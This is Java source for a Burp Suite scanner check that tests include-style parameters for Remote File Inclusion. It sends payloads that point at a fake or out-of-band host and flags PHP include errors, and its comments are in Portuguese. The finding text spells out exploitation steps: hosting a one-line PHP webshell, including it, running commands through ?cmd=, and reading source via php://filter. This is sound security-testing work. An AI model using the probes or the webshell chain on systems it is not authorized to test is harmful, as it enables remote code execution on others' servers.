package com.rx0.burp.scanner.checks;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import com.rx0.burp.model.Finding;
import com.rx0.burp.model.Severity;
import com.rx0.burp.scanner.ScanContext;
import com.rx0.burp.scanner.VulnCheck;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Pattern;

/**
 * Testa parâmetros de inclusão de arquivo/página (típicos de apps PHP mais
 * antigos) com uma URL externa inexistente, procurando por mensagens de erro
 * que comprovem que o servidor TENTOU buscar/incluir aquela URL remota
 * (Remote File Inclusion — detecção baseada em erro, sem precisar hospedar
 * payload externo).
 *
 * Criado por Rx0 - @rodrigocoutinho91
 */
public class RfiCheck implements VulnCheck {

    private static final String[] PARAM_NAMES = {
            "file", "page", "template", "include", "lang", "language", "doc",
            "module", "view", "content", "path"
    };

    // Domínio propositalmente inexistente — se o servidor tentar resolver/buscar, o erro confirma RFI
    private static final String DOMINIO_FALSO = "rx0-rfi-test-" + (System.currentTimeMillis() % 100000) + ".invalid-nao-existe.test";
    private static final String PAYLOAD = "http://" + DOMINIO_FALSO + "/shell.txt";

    private static final Pattern[] ASSINATURAS_INCLUDE_REMOTO = {
            Pattern.compile("failed to open stream.*" + Pattern.quote(DOMINIO_FALSO), Pattern.CASE_INSENSITIVE),
            Pattern.compile("include\\(.*" + Pattern.quote(DOMINIO_FALSO) + ".*\\)", Pattern.CASE_INSENSITIVE),
            Pattern.compile("require\\(.*" + Pattern.quote(DOMINIO_FALSO) + ".*\\)", Pattern.CASE_INSENSITIVE),
            Pattern.compile("getaddrinfo failed.*" + Pattern.quote(DOMINIO_FALSO), Pattern.CASE_INSENSITIVE),
            Pattern.compile("URL file-access is disabled", Pattern.CASE_INSENSITIVE), // allow_url_include=off — confirma que o include aceitou URL
            Pattern.compile("allow_url_include", Pattern.CASE_INSENSITIVE),
    };

    @Override
    public String nome() {
        return "RFI — Remote File Inclusion (probe baseado em erro)";
    }

    @Override
    public List<Finding> executar(MontoyaApi api, String baseUrl) {
        return executar(api, baseUrl, (ScanContext) null);
    }

    @Override
    public List<Finding> executar(MontoyaApi api, String baseUrl, ScanContext ctx) {
        List<Finding> achados = new ArrayList<>();
        String base = baseUrl.endsWith("/") ? baseUrl.substring(0, baseUrl.length() - 1) : baseUrl;

        // --- Confirmação OOB via interactsh: usa um host REAL (que responde HTTP) em vez do domínio falso ---
        if (ctx != null && ctx.interactsh() != null && ctx.interactsh().isDisponivel()) {
            for (String param : PARAM_NAMES) {
                try {
                    String host = ctx.interactsh().criarProbe(
                            "RFI confirmado via interação out-of-band no parâmetro '" + param + "'",
                            Severity.CRITICA,
                            base,
                            "O servidor efetivamente buscou/incluiu a URL remota de teste no parâmetro '" + param + "' — " +
                                    "confirmação inequívoca de Remote File Inclusion, com a requisição HTTP sendo recebida " +
                                    "de verdade (diferente da detecção por mensagem de erro, que é mais fraca).",
                            "Nunca passe entrada do usuário para funções de include/require/fopen com suporte a wrapper de URL. " +
                                    "Desabilite allow_url_include e allow_url_fopen, e use allowlist fixa de arquivos permitidos.",
                            "1) Hospede um webshell real nesse mesmo tipo de endpoint externo e repita o teste pra confirmar " +
                                    "execução de código (não só inclusão). 2) O fato de o servidor ter feito a requisição HTTP " +
                                    "já é RFI confirmado — qualquer conteúdo PHP/JSP/ASP hospedado lá seria executado no alvo.");
                    if (host != null) {
                        String payloadOob = "http://" + host + "/shell.txt";
                        String urlOob = base + "/?" + param + "=" + java.net.URLEncoder.encode(payloadOob, "UTF-8");
                        api.http().sendRequest(HttpRequest.httpRequestFromUrl(urlOob));
                    }
                } catch (Exception e) {
                    api.logging().logToError("[Rx0] Erro ao disparar probe OOB de RFI (param " + param + "): " + e.getMessage());
                }
            }
        }

        for (String param : PARAM_NAMES) {
            try {
                String url = base + "/?" + param + "=" + java.net.URLEncoder.encode(PAYLOAD, "UTF-8");
                HttpRequest req = HttpRequest.httpRequestFromUrl(url);
                HttpResponse resp = api.http().sendRequest(req).response();
                if (resp == null) continue;

                String body = resp.bodyToString();
                if (body == null) continue;

                for (Pattern p : ASSINATURAS_INCLUDE_REMOTO) {
                    if (p.matcher(body).find()) {
                        boolean confirmaFuncaoVulneravel = p.pattern().contains("allow_url_include") || p.pattern().contains("URL file-access");
                        achados.add(new Finding(
                                (confirmaFuncaoVulneravel
                                        ? "Parâmetro aceita URL em função include/require (RFI possivelmente bloqueado por config)"
                                        : "Possível RFI confirmado no parâmetro '" + param + "'"),
                                confirmaFuncaoVulneravel ? Severity.MEDIA : Severity.CRITICA,
                                url,
                                confirmaFuncaoVulneravel
                                        ? "O servidor processa o parâmetro em uma função de inclusão de arquivo e tentou tratá-lo como URL remota, " +
                                          "mas a busca de URL externa está desabilitada (allow_url_include=Off). Hoje não é explorável, mas o padrão " +
                                          "de código é perigoso — se essa configuração mudar, vira RFI completo."
                                        : "O servidor tentou buscar a URL remota forjada que enviamos no parâmetro '" + param + "' (erro de DNS/stream " +
                                          "referenciando nosso domínio de teste apareceu na resposta), confirmando que a entrada é usada diretamente em " +
                                          "uma função de inclusão/leitura remota.",
                                "Payload: " + PAYLOAD + " | Assinatura: " + p.pattern(),
                                "Nunca passe entrada do usuário para funções de include/require/fopen com suporte a wrapper de URL. " +
                                        "Desabilite allow_url_include e allow_url_fopen, e use allowlist fixa de arquivos permitidos.",
                                confirmaFuncaoVulneravel
                                        ? "1) Mesmo com allow_url_include=Off, teste php://filter/convert.base64-encode/resource=index.php " +
                                          "no mesmo parâmetro pra ler código-fonte (isso não depende de allow_url_include). 2) Reavalie se a " +
                                          "config pode mudar em outro ambiente (staging, por exemplo)."
                                        : "1) Hospede um arquivo 'shell.txt' com um webshell PHP simples (ex: <?php system($_GET['cmd']); ?>) " +
                                          "em um servidor que você controla. 2) No Repeater, troque o payload pelo link real desse arquivo no " +
                                          "parâmetro '" + param + "'. 3) Se incluído, acesse <url_alvo>?cmd=id pra confirmar execução remota de código completa."));
                        break;
                    }
                }
            } catch (Exception e) {
                api.logging().logToError("[Rx0] Erro no check de RFI (param " + param + "): " + e.getMessage());
            }
        }
        return achados;
    }
}
